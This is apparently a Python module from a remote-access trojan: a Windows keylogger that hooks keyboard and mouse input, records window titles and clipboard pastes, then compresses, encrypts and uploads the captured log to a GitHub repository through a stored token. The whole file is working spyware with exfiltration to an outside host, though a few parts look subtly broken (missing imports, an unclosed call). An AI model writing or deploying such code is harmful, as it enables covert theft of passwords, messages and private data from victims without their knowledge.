#module to log key stroke
#windows only
#takes interval and period arguments
#interval - true to continue indefinately, false to quit after period
#period - if interval is false, run until period; if interval is true, push data after each period

import pythoncom #library for com automation (windows)
import win32event
import pyHook #library for windows input hooks
import win32clipboard
import StringIO #look into cStringIO
import time
from github3 import login

#ctypes was only used to get wondow name which we dont need
#user32 = windll.user32
#kernel32 = windll.kernel32
#psapi = windll.psapi
current_window = None

def init_strio():
	global log
	log = StringIO.StringIO()
	log.write("winkeylog at " + time.time())
	return

def check_window(event):
	global log
	global current_window
	if event.WindowName != current_window:
		current_window = event.WindowName
		log.write(current_window + "\n")
	return

#callback on keystroke
def KeyStroke(event):
	global log

	#check if current window has changed
	check_window(event)

	if event.Ascii > 32 and event.Ascii < 127: #standard key
		log.write(chr(event.Ascii))
	else:
		#get clipboard if ctrl-v
		if event.Key == "V": #need to test for paste
			win32clipboard.OpenClipboard()
			pasted = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			log.write("[Paste] " + pasted + " ")
		else:
			log.write(" " + event.Key + " ")

	return True #pass execution to next hook in queue

def MouseLeft(event):
	global log
	check_window(event)
	log.write("Left mouse: " + str(event.Position) + " ")
	return True


def MouseRight(event):
	global log
	check_window(event)
	log.write("Right mouse: " + str(event.Position) + " ")
	return True

def push_data(config): #need to sub in random identifiers
	global log
	gh = login(token = config.g_token())
	repo = gh.repository(config.g_usr(), config.g_repo())
	repo.create_file(config.g_data(), config.g_com(), encrypt(log.getvalue(), 
									config)
	log.close()
	init_strio()
	return

def encrypt(data, config):
	key = config.pk
        size = config.siz
        offset = 0
        encrypted = ""
        compressed = zlib.compress(data)
        while offset < len(compressed):
                chunk = compressed[offset:offset+size]
                encrypted += key.encrypt(chunk)
                offset += size
        return base64.b64encode(encrypted)

def run(config, **args):
	global log

	#argument processing
	try:
		interval = args["interval"]
	except:
		interval = False #quit after period
	try:
		period = args["period"]
	except:
		period = 3600 #1 hour

	#setup
	kl = pyHook.HookManager() #create hook manager
	kl.KeyDown = KeyStroke #register callback on keydown
	kl.MouseLeftDown = MouseLeft #register callback on mouse
	kl.MouseRightDown = MouseRight	
	kl.HookKeyboard()
	kl.HookMouse()

	if interval:
		while True:
			start = time.time()
			while time.time() - start < period:
				pythoncom.PumpWaitingMessages()
				win32event.MsgWaitForMultipleObjects([], False, 
						100, win32event.QS_ALLEVENTS)
			try:
				push_data(config)
			except:
				pass #just keep going if we cant push
	else: #msgwait timeout is in milliseconds
		while time.clock() < period:
			pythoncom.PumpWaitingMessages()
			win32event.MsgWaitForMultipleObjects([], False, 100, 
							win32event.QS_ALLEVENTS)

	#cleanup	
	data = log.getvalue()
	log.close()
	kl.UnhookMouse()
	kl.UnhookKeyboard()

	return None, data
